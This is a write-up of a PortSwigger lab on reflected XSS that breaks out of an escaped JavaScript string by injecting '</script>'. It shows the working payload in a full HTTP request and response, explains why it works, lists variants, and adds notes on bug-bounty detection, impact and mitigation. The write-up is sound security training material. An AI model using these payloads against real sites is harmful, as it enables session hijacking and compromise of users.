# LAB: Reflected XSS into a JavaScript string with single quote and backslash escaped

|                             |                                                                                                                                 |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| **Topic**                   | Cross-site scripting (XSS)                                                                                                    |
| **Difficulty**              | Practitioner                                                                                                                   |
| **Date**                    | 2026-11-26                                                                                                                     |
| **Time**                    |                       15                                                                                                          |
| **Solved without solution** | yes                                                                                                                             |
| **Link**                    | [lab-javascript-string-single-quote-backslash-escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped) |

## 1. Objective

Perform a Reflected Cross-Site Scripting (XSS) attack on a search feature where user input is reflected inside a JavaScript single-quoted string literal, and both single quotes (`'`) and backslashes (`\`) are escaped, executing `alert()`.

## 2. Surface

- URL query parameter (`/search?search=...`).
- Server-side escaping mechanism neutralizing single quotes (`'` -> `\'`) and backslashes (`\` -> `\\`).
- Inline JavaScript reflection context: Input reflected directly inside a `<script>` tag within a string variable assignment (e.g., `var searchTerms = 'USER_INPUT';`).

## 3. Hypothesis

If user input is reflected inside an inline `<script>` block and the application attempts to prevent breaking out of string literals by escaping single quotes and backslashes, but fails to encode angle brackets (`<` and `>`), an attacker can terminate the surrounding `<script>` block entirely by injecting `</script>`. Inserting a new `<script>` tag or HTML vector immediately after the closing tag will execute JavaScript outside the original string context.

## 4. Payload that worked

Request:
```http
GET /?search=%3C%2Fscript%3E%3Cimg+src%3D1+onerror%3Dalert%28document.domain%29%3E HTTP/2
Host: 0a7c00cb0426628f81e920fc00c3008e.web-security-academy.net
Cookie: session=TZ7hdjMBmIHXQFuv23v3XJtPAVOeij8I
Sec-Ch-Ua: "Not:A-Brand";v="8", "Chromium";v="156"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a7c00cb0426628f81e920fc00c3008e.web-security-academy.net/?search=%3Ctest
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```
Response:
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3687
<script>
  var searchTerms = '
</script>
<img src="1" onerror="alert(document.domain)">';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
<section class="blog-list no-results">
```

## 5. Why it works

Analyzing the inline page source revealed that user input is reflected directly inside a single-quoted JavaScript string literal within an inline `<script>` element:

```html
<script>
    var searchTerms = 'USER_INPUT';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

Although the backend application attempts to secure the string assignment by escaping single quotes (`'` -> `\'`) and backslashes (`\` -> `\\`) to prevent JavaScript string breakout, it fails to HTML-encode angle brackets (`<` and `>`).

In web browsers, the HTML parser processes the document stream before the JavaScript engine executes the script:
1. When the HTML parser encounters the sequence `</script>`, it immediately interprets it as the closing boundary of the current inline `<script>` block, regardless of whether it appears inside a JavaScript string literal or escaped context.
2. Injecting `</script><img src=1 onerror=alert(document.domain)>` prematurely terminates the original `<script>` tag.
3. The remaining payload `<img src=1 onerror=alert(document.domain)>` is parsed as standard HTML content following the script tag.
4. The browser attempts to render the broken `<img>` element from invalid source `1`, firing the `onerror` event handler and executing `alert(document.domain)`.

## 6. What I tried that failed

- Inspecting the `document.write` call initially suggested a DOM-based sink exploitation path, but auditing the variable processing showed that `searchTerms` was wrapped in `encodeURIComponent()`, neutralizing standard payload characters passed into the tracking pixel URL.
- Attempting to break out of the JavaScript string using single quotes (`'`) or backslashes (`\`) failed because the server properly escaped them (`\'`), resulting in syntax errors or literal string assignments inside the JS engine context.
- Injecting `</script>` successfully bypassed the JavaScript string escaping mechanism because the HTML parser takes precedence over JavaScript context rules when identifying element closing tags.
- Rule extracted: HTML parsers do not understand JavaScript string context. When input is reflected inside an inline `<script>` block, escaping quotes is useless against `</script>` breakouts if angle brackets are unencoded; closing the script block allows direct injection of HTML elements with event handlers.

## 7. In a real target (bounty translation)

- Where it shows up: Dynamic inline JavaScript blocks, analytics scripts, page context setup variables, and server-rendered frontend state initialization.
- Quick detection: Pass test strings containing single quotes, backslashes, and closing script tags (`</script>`) to verify if the HTML parser breaks out of the inline script block before JavaScript parsing occurs.
- Impact: Reflected XSS execution bypassing script-level string escaping protections, enabling session hijacking, DOM manipulation, or arbitrary code execution.
- In the report: Document the inline script reflection context, show how HTML parsing takes precedence over JavaScript string escaping, and supply the script tag breakout PoC.

## 8. Bypass / variants noticed

- Re-opening a new script tag after closing the initial block: `</script><script>alert(document.domain)</script>`.
- Using alternative HTML tags with immediate execution vectors following script closure, such as `</script><svg onload=alert(document.domain)>`.

## 9. Takeaway

Escaping JavaScript string literals (even with backslash escaping) is insufficient to prevent XSS if input is reflected inside an inline `<script>` block. HTML parsers prioritize closing HTML tags like `</script>` over JavaScript execution syntax. Applications must perform proper HTML/JS encoding or use `JSON.stringify()` / safe data attributes to pass data from backend to client scripts.
